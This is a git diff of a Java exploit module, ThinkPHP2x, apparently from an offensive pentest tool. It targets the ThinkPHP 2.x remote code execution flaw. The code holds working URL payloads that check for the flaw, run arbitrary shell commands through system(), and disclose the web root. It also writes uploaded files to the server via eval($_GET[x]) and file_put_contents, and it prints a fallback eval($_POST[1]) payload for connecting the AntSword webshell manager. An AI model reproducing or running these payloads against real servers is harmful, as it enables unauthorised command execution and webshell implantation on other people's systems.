@@ -1,11 +1,13 @@
 package fun.fireline.exp.php.thinkphp;
 
 import fun.fireline.core.ExploitInterface;
-import fun.fireline.tools.HttpTool;
+import fun.fireline.tools.HttpTools;
+import fun.fireline.tools.Response;
+import fun.fireline.tools.Tools;
 
 import java.net.URLEncoder;
 import java.util.Base64;
-import java.util.UUID;
+import java.util.HashMap;
 
 /**
  * @author yhy
@@ -19,61 +21,49 @@ public class ThinkPHP2x implements ExploitInterface {
 
     private boolean isVul = false;
 
+    private HashMap<String, String> headers = new HashMap();
     // 检测漏洞是否存在
     @Override
-    public boolean checkVul(String url) {
+    public String checkVul(String url) {
         this.target = url;
         // 这里可以通过判断对方是否执行了 md5 计算，输出 202cb962ac59075b964b07152d234b70 来验证漏洞是否存在
         String check_payload = "/index.php?s=/index/index/name/${@print(md5(123))}";
-        // post 请求，根据不同的exp，可能需要不同的请求方式，看需更改，请求方式基本都实现了，若有遗漏，请提交issues
-        try {
-            // 使用 src/main/java/fun/fireline/tools/HttpTool.java 工具包中的 get 方法提交
-            // 注意 这要用 try  catch 捕获一下异常
-            String result = HttpTool.getHttpReuest(this.target + check_payload, "UTF-8");
-            // 看回显，是否存在 202cb962ac59075b964b07152d234b70
-            boolean flag = result.contains("202cb962ac59075b964b07152d234b70");
-            if(flag) {
-                this.isVul = true;  // 存在漏洞
-            }
-            return flag;
+        // get 请求，根据不同的exp，可能需要不同的请求方式，看需更改
+        Response response = HttpTools.get(this.target + check_payload, this.headers, "UTF-8");
 
-        } catch (Exception e) {
-            // 输出错误日志
-            logger.error(e);
+        // 看回显，是否存在 202cb962ac59075b964b07152d234b70
+        if(response.getText() != null  && response.getText().contains("202cb962ac59075b964b07152d234b70")) {
+            this.isVul = true;
+            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
+        } else if (response.getError() != null) {
+            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
+        } else {
+            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
         }
-
-        return false;
     }
 
     // 命令执行
     @Override
     public String exeCmd(String cmd, String encoding) {
         String payload = "/index.php?s=/index/index/name/${@print(system(payload))}";
-        try {
-            // 替换payload 中的 payload 字符为要执行的命令
-            payload = payload.replace("payload", cmd);
-            String result = HttpTool.getHttpReuest(this.target + payload, "UTF-8");
-            return result.split("<!DOCTYPE html")[0];
 
-        } catch (Exception e) {
-            logger.error(e);
-        }
-        return "fail";
+        // 替换payload 中的 payload 字符为要执行的命令
+        payload = payload.replace("payload", cmd);
+
+        Response response = HttpTools.get(this.target + payload, this.headers, "UTF-8");
+
+        return Tools.regReplace(response.getText());
     }
 
     // 获取当前的web路径，有最好，没有也无所谓
     @Override
     public String getWebPath() {
         String payload = "/index.php?s=/index/index/name/${@print(realpath(__ROOT__))}";
-        try {
-            String result = HttpTool.getHttpReuest(this.target + payload, "UTF-8");
-            // 这个payload会把 html网页也给输出，这里分割简单去除一下
-            return result.split("<!DOCTYPE html")[0];
+        Response response = HttpTools.get(this.target + payload, this.headers, "UTF-8");
 
-        } catch (Exception e) {
-            logger.error(e);
-        }
-        return "命令执行失败";
+        // 这个payload会把 html网页也给输出，这里分割简单去除一下
+        return Tools.regReplace(response.getText());
+
     }
 
     @Override
@@ -86,14 +76,11 @@ public class ThinkPHP2x implements ExploitInterface {
 
         String payload = "/index.php?s=/sd/iex/xxx/${@eval($_GET[x])}&x=file_put_contents('" + filename + "',base64_decode('" + base64Data + "'));";
 
-        HttpTool.getHttpReuest(this.target + payload, "UTF-8");
+        Response response = HttpTools.get(this.target + payload, this.headers, "UTF-8");
 
-        // 上传后，访问一次上传的文件，看返回值是否为200来判断是否上传成功
-        int status = HttpTool.getHttpURLConnection(this.target + "/" + filename).getResponseCode();
-
-        System.out.println(this.target + "/" + filename);
-        System.out.println(status);
-        if(status == 200) {
+        if (response.getError() == null) {
+            // 上传后，访问一次上传的文件，看返回值是否为200来判断是否上传成功
+            response = HttpTools.get(this.target + "/" + filename, this.headers, "UTF-8");
             result = "上传成功! 路径： " + this.target + "/" + filename;
         } else {
             result =  "上传失败， 请用这个payload，蚁剑连接试一下 /index.php?s=/index/index/name/${${@eval($_POST[1])}}";
